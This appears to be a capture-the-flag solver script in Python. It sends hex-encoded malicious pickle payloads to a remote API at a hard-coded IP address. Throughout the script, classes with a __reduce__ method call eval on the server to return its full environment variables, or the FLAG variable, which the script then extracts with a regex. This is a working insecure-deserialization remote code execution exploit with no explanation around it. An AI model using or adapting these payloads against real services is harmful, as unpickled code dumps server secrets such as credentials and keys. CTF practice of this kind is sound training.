#!/usr/bin/env python3
"""Get the flag from environment variables"""

import requests
import pickle
import re

URL = "http://138.199.163.92:13696/api"

print("=" * 60)
print("GREETINGS 2 - GETTING FLAG FROM ENV")
print("=" * 60)

# Read environment variables
print("\n[*] Reading environment variables...")

class RCE:
    def __reduce__(self):
        import os
        return (eval, ("str(dict(__import__('os').environ))",))

payload = pickle.dumps(RCE()).hex()

try:
    r = requests.post(URL, json={"obj": payload}, timeout=5)
    print(f"    Status: {r.status_code}")
    print(f"    Response length: {len(r.text)}")
    
    # Search for flag in response
    flag_match = re.search(r'Kaal\{[^}]+\}', r.text)
    if flag_match:
        print(f"\n[+] FOUND FLAG: {flag_match.group(0)}")
    else:
        # Print full response to see what we got
        print(f"\n    Full response:\n{r.text[:1000]}")
        
except Exception as e:
    print(f"    Error: {e}")

# Alternative: Try to get FLAG env var directly
print("\n[*] Trying to get FLAG environment variable directly...")

class RCE2:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'not found')",))

payload2 = pickle.dumps(RCE2()).hex()

try:
    r = requests.post(URL, json={"obj": payload2}, timeout=5)
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text}")
    
    flag_match = re.search(r'Kaal\{[^}]+\}', r.text)
    if flag_match:
        print(f"\n[+] FLAG: {flag_match.group(0)}")
        
except Exception as e:
    print(f"    Error: {e}")

print("\n" + "=" * 60)
